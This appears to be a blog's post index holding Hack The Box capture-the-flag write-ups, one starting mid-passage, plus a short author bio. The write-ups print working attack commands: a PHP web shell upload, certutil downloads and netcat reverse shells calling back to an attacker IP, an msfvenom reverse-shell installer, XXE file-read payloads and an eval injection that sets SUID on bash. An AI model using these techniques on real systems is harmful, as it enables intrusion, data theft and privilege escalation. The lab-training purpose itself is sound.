browser we are accessing the home.php page, meaning that we have bypassed the login page redirect.To make this persistent and automatically change the 302 Found status code to 200 OK, we can use the following option from Burpsuite in Proxy &gt; Options &gt; Match and Replace:Burpsuite match and replaceThis will allow us to not have to change manually every response of resources that we can’t access, thus making all the web pages display correctly, even though we don’t have credentials to access them.User ShellUploading malicious PHP fileNow that we have access to the web server’s dashboard, we will go to the voters page. This page lets us add voters to the system. We will proceed to add a new voter.This will take us to a web form that has the Firstname, Lastname, Password and Photo fields. We have an upload feature for the Photo field. We know that the server is running over PHP so we will focus on this upload feature. If we manage to sneak in PHP code in the image that we are uploading, and the image is not being sanitized, we have a chance that the server interprets the code and we gain RCE (Remote Command Execution.First, we will do a test with a real image:Real Image Upload TestWe will intercept this request with Burpsuite to see how images are being uploaded to the server:Burpsuite InterceptWe can see how we have delimited fields in our request. We will center our attention on the one that contains the photo, as it will be the field where we are going to try to sneak our PHP payload.In order to bypass any kind of filter the upload feature can have to identify fraudulent files, we will maintain the Content-Type as image/jpeg. Then, we will change the extension of the filename to PHP and the content of the image to PHP code that allows us to execute system-level commands on the victim machine via a GET HTTP parameter:Burpsuite requestIf we remember the enumeration phase, we had an image directory on the web server. This directory can be the one where the user-uploaded images are being hosted, so we will proceed to examine it. We need to find if our PHP code is in this directory, as we need to access it in order to be interpreted by the web server.We can see our test.php file in the directory, so we will access to it and use the cmd parameter in the URL to execute commands on the target machine:whoami in Web ShellWe can see that we have gained RCE as the phoebe user.Reverse ShellNow we will try to convert this web shell into a reverse shell. In order to do this, we have to download the Windows Netcat binary and host it on an HTTP server with python3 -m http.server.From the web shell, we will transfer the binary to the target machine, in order to execute it and gain a reverse shell. To do this, we will use certutil.exe:http://10.10.10.239/Images/test.php?cmd=certutil.exe%20-f%20-split%20-urlcache%20http://10.10.15.1/nc.exeNetcat transferOnce we have the Netcat binary on the target machine, we will send a reverse shell to our machine. To do this, the first thing to do is to listen in a port of our machine, in this case in the 443:nc -nlvp 443In the browser, using the binary that we have just transferred:http://10.10.10.239/images/test.php?cmd=nc.exe%20-e%20cmd.exe%2010.10.15.1%20443Reverse Shell whoamiWe will proceed to read the user.txt flag in the C:\\Users\\phoebe\\Desktop directory.System ShellEnumerationAt this point, we have to enumerate the target machine in order to escalate privileges. To do this, we will use winPEAS.First we will check the architecture and the version of Windows of the target machine using the systeminfo command:SysteminfoWe can see that we are dealing with a 64 bit architecture, so we will use the winPEAS x64 binary.Same to what we have done with the Netcat binary, we will transfer the winPEAS binary to our target machine. To do this, we will host the file with python -m http.server, and we will type the following command on the target machine:certutil.exe -f -split -urlcache http://10.10.15.1/winPEASx64.exeNow, we will execute the winPEAS binary and export all the output to a file:winPEASx64.exe &gt; winPeas.txtIf we check the results of winPEAS, we can see the following:winPEAS outputWe can see how we are suggested to exploit the AlwaysInstallElevated privilege. This privilege allows any user to execute files with .msi extension (common Windows installers) as the Administrator user.First, we will check if we really have this privilege on the target machine. In order to do this, we need to check some values in the Windows registry with the following commands:reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedRegistry valuesWe can see how both of them have a value of 1. This means that we can abuse this privilege.Malicious .msi fileTo exploit this privilege, we can create a .msi malicious file with msfvenom that contains a TCP reverse shell. To do this:msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.1 LPORT=9999 -f msi &gt; 1.msi.msi File CreationOnce we have the .msi file, we host it with python3 -m http.server command and we transfer it to the target machine with certutil.exe:.msi File TransferAt the same time, we will start listening on the 9999 port using Netcat:nc -nlvp 9999Once the file is on the target machine and we are listening on the 9999 port, we will use the following command to execute the file that we have just transferred to the target machine:msiexec /quiet /qn /i 1.msiIf everything goes well, we will receive a TCP reverse shell as the nt authority\\system user:whoami systemWe will proceed to see the root.txt flag in the C:\\Users\\Administrator\\Desktop directory." }, { "title": "BountyHunter Write-up", "url": "/posts/bountyhunter/", "categories": "Hack The Box, Linux", "tags": "htb, linux, xxe, sudo", "date": "2022-09-27 09:00:00 +0200", "snippet": "EnumerationNmapFirst, we will start enumerating the open ports on the victim machine. To do that, we will use nmap. We will specify that we want to scan all the port range, that we only want to display the open ports and that we will use the TCP Syn Port Scan scanning method. Optionally, we will specify explicitly that we don’t want to perform host discovery and DNS resolution. This will speed up the process. Lastly, we will export all the evidence to a file called allPorts:nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.100# Nmap 7.91 scan initiated Tue Aug 3 18:20:54 2021 as: nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.100# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10.10.11.100 ()\tStatus: UpHost: 10.10.11.100 ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///\tIgnored State: closed (65533)# Nmap done at Tue Aug 3 18:21:08 2021 -- 1 IP address (1 host up) scanned in 13.80 secondsOnce we know the open ports on the victim machine, we will perform a more exhaustive scan to try to discover services and versions running on the server. We will save them in a file called targeted:nmap -sC -sV -p22,80 -oN targeted 10.10.11.100# Nmap 7.91 scan initiated Tue Aug 3 12:54:08 2021 as: nmap -sC -sV -p22,80 -oN targeted 10.10.11.100Nmap scan report for 10.10.11.100Host is up (0.043s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)|_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Bounty HuntersService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Aug 3 12:54:17 2021 -- 1 IP address (1 host up) scanned in 8.93 secondsAs we see, we only have port 22 (SSH) and port 80 (HTTP) open.Web ServerWe will start by enumerating the web server.If we access the web server using the browser, we will see the following:Web Server IndexWe can see the page is pretty simple, so we will examine its different resources. In the portal tab we will see the following:Web Server Portal TabThis hyperlink will redirect us to the log_submit.php page that will look as follows:log_submit.phpFuzzingWe don’t have a clear attack vector yet, so we will continue exploring. First of all, we will fuzz the web server in order to find directories in the root of it. To do that, we will use the tool wfuzz along with the directory-list-2.3-medium.txt wordlist:wfuzz -c --hc=404 -f fuzzRoot,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZTarget: http://10.10.11.100/FUZZTotal requests: 220560==================================================================ID Response Lines Word Chars Request ==================================================================00001: C=200 388 L\t 1470 W\t 25168 Ch\t \"# directory-list-2.3-medium.txt\"00003: C=200 388 L\t 1470 W\t 25168 Ch\t \"# Copyright 2007 James Fisher\"00007: C=200 388 L\t 1470 W\t 25168 Ch\t \"# license, visit http://creativecommons.org/licenses/by-sa/3.0/\"00014: C=200 388 L\t 1470 W\t 25168 Ch\t \"http://10.10.11.100/\"00012: C=200 388 L\t 1470 W\t 25168 Ch\t \"# on at least 2 different hosts\"00013: C=200 388 L\t 1470 W\t 25168 Ch\t \"#\"00011: C=200 388 L\t 1470 W\t 25168 Ch\t \"# Priority ordered case sensitive list, where entries were found\"00010: C=200 388 L\t 1470 W\t 25168 Ch\t \"#\"00009: C=200 388 L\t 1470 W\t 25168 Ch\t \"# Suite 300, San Francisco, California, 94105, USA.\"00006: C=200 388 L\t 1470 W\t 25168 Ch\t \"# Attribution-Share Alike 3.0 License. To view a copy of this\"00008: C=200 388 L\t 1470 W\t 25168 Ch\t \"# or send a letter to Creative Commons, 171 Second Street,\"00005: C=200 388 L\t 1470 W\t 25168 Ch\t \"# This work is licensed under the Creative Commons\"00002: C=200 388 L\t 1470 W\t 25168 Ch\t \"#\"00004: C=200 388 L\t 1470 W\t 25168 Ch\t \"#\"00084: C=301 9 L\t 28 W\t 316 Ch\t \"resources\"00291: C=301 9 L\t 28 W\t 313 Ch\t \"assets\"00550: C=301 9 L\t 28 W\t 310 Ch\t \"css\"00953: C=301 9 L\t 28 W\t 309 Ch\t \"js\"45240: C=200 388 L\t 1470 W\t 25168 Ch\t \"http://10.10.11.100/\"Total time: 0Processed Requests: 46079Filtered Requests: 46060Requests/sec.: 0We can see that we have some directories that have resources related to the web server. If we try to access these directories, we will notice that the only accessible one is resources. This directory will contain the following files:Resources directoryThere are two files that will attract our attention, README.txt and bountylog.js. If we inspect them:function returnSecret(data) {\treturn Promise.resolve($.ajax({ type: \"POST\", data: {\"data\":data}, url: \"tracker_diRbPr00f314.php\" }));}async function bountySubmit() {\ttry {\t\tvar xml = `&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\t\t&lt;bugreport&gt;\t\t&lt;title&gt;${$('#exploitTitle').val()}&lt;/title&gt;\t\t&lt;cwe&gt;${$('#cwe').val()}&lt;/cwe&gt;\t\t&lt;cvss&gt;${$('#cvss').val()}&lt;/cvss&gt;\t\t&lt;reward&gt;${$('#reward').val()}&lt;/reward&gt;\t\t&lt;/bugreport&gt;`\t\tlet data = await returnSecret(btoa(xml)); \t\t$(\"#return\").html(data)\t}\tcatch(error) {\t\tconsole.log('Error:', error);\t}}If we analyze this file, we can observe that it is a simple JavaScript file that is responsible of making an HTTP POST request to a PHP resource. This POST request contains various XML parameters that are encoded in Base64 and sent to the tracker_diRbPr00f314.php resource. As we can see, user input is not being sanitized, so we can guess that the server is vulnerable to XXE (XML External Entity) Injection.Tasks:[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.[X] Write tracker submit script[ ] Connect tracker submit script to the database[X] Fix developer group permissionsIn the README.txt we will have a TODO list. Two tasks have been completed: writing tracker submit script (we assume that this is the bountylog.js) and fix developer group permissions. But the two other tasks seem not to be completed. These tasks are: connecting the tracker submit script to the database and disabling test account. We will keep this information in mind.We will continue fuzzing the web server for valuable information. We have seen that the web server uses .php files, so we will fuzz in the web server’s root based on this extension. We will do that with the following command:wfuzz -c --hc=404 -f fuzzRootPHP,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ.phpTarget: http://10.10.11.100/FUZZ.phpTotal requests: 220560==================================================================ID Response Lines Word Chars Request ==================================================================00001: C=200 388 L\t 1470 W\t 25168 Ch\t \"# directory-list-2.3-medium.txt\"00007: C=200 388 L\t 1470 W\t 25168 Ch\t \"# license, visit http://creativecommons.org/licenses/by-sa/3.0/\"00003: C=200 388 L\t 1470 W\t 25168 Ch\t \"# Copyright 2007 James Fisher\"00015: C=200 388 L\t 1470 W\t 25168 Ch\t \"index\"00014: C=403 9 L\t 28 W\t 277 Ch\t \"http://10.10.11.100/.php\"00013: C=200 388 L\t 1470 W\t 25168 Ch\t \"#\"00012: C=200 388 L\t 1470 W\t 25168 Ch\t \"# on atleast 2 different hosts\"00011: C=200 388 L\t 1470 W\t 25168 Ch\t \"# Priority ordered case sensative list, where entries were found\"00010: C=200 388 L\t 1470 W\t 25168 Ch\t \"#\"00009: C=200 388 L\t 1470 W\t 25168 Ch\t \"# Suite 300, San Francisco, California, 94105, USA.\"00006: C=200 388 L\t 1470 W\t 25168 Ch\t \"# Attribution-Share Alike 3.0 License. To view a copy of this\"00008: C=200 388 L\t 1470 W\t 25168 Ch\t \"# or send a letter to Creative Commons, 171 Second Street,\"00005: C=200 388 L\t 1470 W\t 25168 Ch\t \"# This work is licensed under the Creative Commons\"00002: C=200 388 L\t 1470 W\t 25168 Ch\t \"#\"00004: C=200 388 L\t 1470 W\t 25168 Ch\t \"#\"00368: C=200 5 L\t 15 W\t 125 Ch\t \"portal\"00848: C=200 0 L\t 0 W\t 0 Ch\t \"db\"45240: C=403 9 L\t 28 W\t 277 Ch\t \"http://10.10.11.100/.php\"Total time: 0Processed Requests: 125506Filtered Requests: 125488Requests/sec.: 0We can see two files: portal.php (we already knew about it) and db.php. This last file will attract our attention as this type of file often contains credentials. We can’t read it as it is being interpreted by the web server, so we will keep it in mind for the future.User ShellXXE (External XML Entity) InjectionAs we have seen in the previous enumeration phase, log_submit.php sends to tracker_diRbPr00f314.php via a POST HTTP request, an XML file encoded in Base64 with the parameters found in the web form.We will run a simple test in the form:Simple test in web formWe will intercept this request using the popular Burpsuite proxy:Burpsuite InterceptAs we can see, we have a big string that we guess is Base64, so we will copy this data and paste it into the Burpsuite decoder:Burpsuite DecoderSince we are dealing with an HTTP request, we suppose it is Base64 encoded and URL encoded. Once we have decoded the string, we can see that it corresponds to an XML file with the same structure that we have seen in bountylog.js.Now that we know we can send an encoded XML file and that the server might be interpreting it, we will test for XXE Injection. To do this, we will use the XML file that we just decoded as a template for our payload. We will create an external entity in this file, named example, that contains a 'test'string. Then, we will replace one of the XML tags content (in this case, we choose reward) with a reference to the external entity that we have just created. The resulting payload will look like this:&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE replace [ &lt;!ENTITY example \"test\"&gt;]&gt;\t\t&lt;bugreport&gt;\t\t&lt;title&gt;a&lt;/title&gt;\t\t&lt;cwe&gt;a&lt;/cwe&gt;\t\t&lt;cvss&gt;a&lt;/cvss&gt;\t\t&lt;reward&gt;&amp;example;&lt;/reward&gt;\t\t&lt;/bugreport&gt;Then, we will proceed to encode this payload. First, we will encode it in Base64 and then, in URL encode:Burpsuite DecoderLastly, we will insert the created payload into the data parameter of the HTTP POST request:Burpsuite HTTP RequestOnce we send the HTTP request, we can see what happens in the browser:BrowserWe can see that our external entity named example, that contained the 'test' string, is being represented in the reward field. So now we can say that the server is vulnerable to XXE Injection.Now, we will try to read files from the target machine. To do this, we can use the wrapper named file. In this case, we will list the /etc/passwd file, using the following payload and repeating the process explained above:&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE reward [ \t&lt;!ELEMENT reward ANY &gt;\t&lt;!ENTITY file SYSTEM \"file:///etc/passwd\" &gt;]&gt;\t\t&lt;bugreport&gt;\t\t&lt;title&gt;a&lt;/title&gt;\t\t&lt;cwe&gt;a&lt;/cwe&gt;\t\t&lt;cvss&gt;a&lt;/cvss&gt;\t\t&lt;reward&gt;&amp;file;&lt;/reward&gt;\t\t&lt;/bugreport&gt;/etc/passwd displayingWe can see that we are being displayed the /etc/passwd of the target machine. This is always useful to identify the users of the machine, since we can see their home directories and if they have a shell assigned or not. In this case, we have the users development and root.As we remember from the enumeration phase, we had a file called db.php that we could not read because it was being interpreted by the web server. Since we are able to read files from the victim machine, we will try to use a PHP wrapper that encodes the content of a file in Base64 and displays it. We will use it to read the contents of the db.php file. To do this, we will use the following payload:&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE reward [ \t&lt;!ELEMENT reward ANY &gt;\t&lt;!ENTITY file SYSTEM \"php://filter/convert.base64-encode/resource=db.php\" &gt;]&gt;\t\t&lt;bugreport&gt;\t\t&lt;title&gt;a&lt;/title&gt;\t\t&lt;cwe&gt;a&lt;/cwe&gt;\t\t&lt;cvss&gt;a&lt;/cvss&gt;\t\t&lt;reward&gt;&amp;file;&lt;/reward&gt;\t\t&lt;/bugreport&gt;Once we have got the response from the server, we will decode the displayed Base64 string using the following command:db.php decodingadmin:m19RoAU0hP41A1sTsq6KWe can see that we have got some credentials. As we don’t have any login panel on the web server, we will try to determine if the user is reusing this password. We will try the found credentials in the other service that we identified in the enumeration phase, SSH. We already know that there is a user called development, as we have seen it in the /etc/passwd file. We will try to connect with the following command and the found password:ssh development@10.10.11.100whoami developmentWe can see that we have a shell as the user development. So we proceed to read the user.txt flag located in the /home/development/ directory.Root ShellPasswordless sudoNow that we are the development user, we will try to escalate privileges to become the root user.We will start our enumeration by listing the commands that we can run as sudo. We can use the following command for that:sudo -lsudo privilegesWe can see that we have the capacity to execute the /opt/skytrain_inc/ticketValidator.py script with python3.8, being the root user and not having to provide a password.Python Script Source Code AnalysisWe will proceed to analyze the /opt/skytrain_inc/ticketValidator.py file (some parts of the script are commented to better understand how it works):#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc): # Checks for .md extension and loads file if loc.endswith(\".md\"): return open(loc, 'r') else: print(\"Wrong file type.\") exit()def evaluate(ticketFile): #Evaluates a ticket to check for irregularities. code_line = None for i,x in enumerate(ticketFile.readlines()): # i: Number of line, x: Content of the line if i == 0: if not x.startswith(\"# Skytrain Inc\"): # First line content return False continue if i == 1: if not x.startswith(\"## Ticket to \"): # Second line content return False print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue if x.startswith(\"__Ticket Code:__\"): # Third line content code_line = i+1 continue if code_line and i == code_line: # Fourth line content if not x.startswith(\"**\"): # Has to start with ** return False ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] # Has to have a + sign if int(ticketCode) % 7 == 4: # The first operand of the sum needs to have a 4 reminder when divided by 7, 'x * 7 + 4 = ticketCode' validationNumber = eval(x.replace(\"**\", \"\")) # Evaluates the complete expression after removing the ** signs if validationNumber &gt; 100: # We have done the eval so this condition does not really matter return True else: return False return Falsedef main(): # Main function fileName = input(\"Please enter the path to the ticket file.\\n\") ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\"Valid ticket.\") else: print(\"Invalid ticket.\") ticket.closemain()We can see that this script is pretty simple. First, there is a prompt with an input to enter the ticket that we want to validate. Then, a validation is done to see if the extension of the file is .md. Following that, the contents of each line of the file are validated, each with a different set of conditions. Lastly, one of the lines, exactly the last one, is being used in an eval expression. Once again, the user input is not being sanitized and, on top of that, is being passed to the eval function as an argument. Since we know the structure that the file has to have and that one of the lines is being evaluated, we will create a malicious payload.We will try to execute the following command on it. This lets us change the permissions of the bash binary to SUID (Set User ID), thus making it possible to execute it in privileged mode (as root) while being a non-privileged user:chmod 4755 /bin/bashKnowing the needed structure and the payload we want to execute, we will construct the following file:# Skytrain Inc## Ticket to hola__Ticket Code:__**11+100 and __import__(\"os\").system(\"chmod 4755 /bin/bash\")**Once we have our payload prepared, we will execute the ticketvalidator.py as root and we will indicate our freshly created payload as the ticket to validate:Exploiting sudo privilegesAfter executing it, we can see that the /bin/bash binary has SUID permission, so we can use the following command to execute it as the root user:bash -proot shellWe can see that we are the root user so we proceed to visualize the root.txtflag in the /root/ directory." }, { "title": "whoami", "url": "/posts/whoami/", "categories": "whoami", "tags": "whoami", "date": "2022-09-26 09:00:00 +0200", "snippet": "I’ve been an enthusiast of technology since I was a child. I remember my first days with a computer, trying to explore every nook of the Operating System (it was Windows 2000) in the after-school computer classes I attended.Everything changed when I was gifted my first computer. Thanks to the power of Google and YouTube, I started to learn how computers work and installed my first Linux distros. Ever since then, I haven’t stopped learning on my own.First, I started learning Linux basics (it was very useful to buy a Raspberry Pi), until I was comfortable working with the terminal. I also set up a home server with multiple services. From Web Servers to Mail Servers, VPN Servers, etc. This helped me to understand how these services work and how to configure them. I also started to learn about Docker and how to deploy services in a simple way.When it was time to go to college, I chose a bachelor’s degree in telecommunications engineering, I made that decision because I had a huge interest in knowing more about computers and radio waves. In the third course, I chose the telematics specialty, as it was the one most related to computers. This has allowed me to learn networking, how to program in different languages such as C or Java and how different protocols work in a low level. I also studied on my own how to program in Python and Bash.The second time everything changed was when I discovered what Pentesting and Ethical Hacking were (never knew that they could be a job). For me, they were everything I needed, and from the first time, I knew that they would be the job I always wanted.In the last year of college, I had to do my bachelor’s thesis. I chose a thesis that was related to cybersecurity and AI, titled On the interplay between performance, efficiency and interpretability of Machine Learning models for Malware Detection. This thesis discusses the value of different machine learning models in a malware detection problem, and it was entirely written in Python.Since I discovered Ethical Hacking, I have been constantly learning about it. At first, I started watching videos of people solving CTFs and explaining concepts about Hacking. Then, I started solving my first labs and reading Bug-Bounty write-ups, as they are very creative and often use new techniques that are worth learning.Now, I’m trying to improve my skills and learn something new every day." } ]
